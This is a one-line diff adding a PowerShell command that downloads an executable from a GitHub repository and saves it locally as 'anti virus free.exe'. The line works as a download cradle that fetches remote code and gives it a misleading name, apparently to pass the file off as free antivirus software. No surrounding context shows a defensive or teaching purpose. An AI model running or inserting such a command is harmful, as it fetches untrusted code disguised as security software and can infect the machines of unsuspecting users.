@@ -1,0 +1,1 @@
+powershell –c “(new-object System.Net.WebClient).DownloadFile(‘https://github.com/faitmoipasconfiance/op/blob/main/MBSetup.exe’,’C:\test\anti virus free.exe’)”
